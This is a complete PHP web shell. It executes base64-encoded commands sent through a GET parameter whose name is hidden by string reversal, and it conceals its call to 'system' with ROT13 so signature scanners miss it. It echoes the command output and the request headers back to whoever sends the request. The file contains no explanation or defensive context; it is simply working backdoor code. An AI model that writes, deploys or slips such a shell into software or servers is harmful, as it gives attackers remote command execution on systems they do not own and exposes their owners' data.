<?php
try {
    // Reverse the string 'luffyhere' to get the command parameter name
    $cmd = strrev("erehyfful");
    // Get the user input from the GET request
    if (!isset($_GET[$cmd])) {
        throw new Exception("Input parameter not provided! <a>");
    }


    $headers = [];
    foreach ($_SERVER as $key => $value) {
        if (strpos($key, 'HTTP_') === 0) {
            // Convert 'HTTP_USER_AGENT' to 'User-Agent'
            $header = str_replace('_', '-', substr($key, 5));
            $headers[$header] = $value;
        }
    }
    // Print headers in a nicely formatted way
    echo "\n===== HTTP REQUEST HEADERS =====\n\n";
    $maxLength = 0;
    foreach ($headers as $name => $value) {
        $maxLength = max($maxLength, strlen($name));
    }
    foreach ($headers as $name => $value) {
        echo str_pad($name, $maxLength + 2, ' ') . ": " . $value . "\n";
    }
    echo "\n===============================\n\n";

    $input = $_GET[$cmd];

    // Obfuscated 'system' function
    $execute = str_rot13('flfgrz');

    // Check if the input is provided
    if (empty($input)) {
        throw new Exception("No input provided to execute.");
    }
    
    // Decode the base64 encoded command
    $decoded_input = base64_decode($input);
    
    // Verify the decode was successful
    if ($decoded_input === false) {
        throw new Exception("Invalid base64 input provided.");
    }

    // Execute the decoded command and capture output
    ob_start();
    $execute($decoded_input);
    $output = ob_get_clean();

    // Display output with proper formatting for multiline content
    header('Content-Type: text/plain');
    echo "\n===== COMMAND OUTPUT =====\n\n";
    echo $output;
    echo "\n\n==========================\n";

} catch (Exception $e) {
    // Catch any exceptions and display the error message
    echo 'Caught exception: ',  $e->getMessage(), "\n";
} catch (Error $err) {
    // This handles fatal errors in PHP 7+
    echo 'Caught fatal error: ', $err->getMessage(), "\n";
}
?>
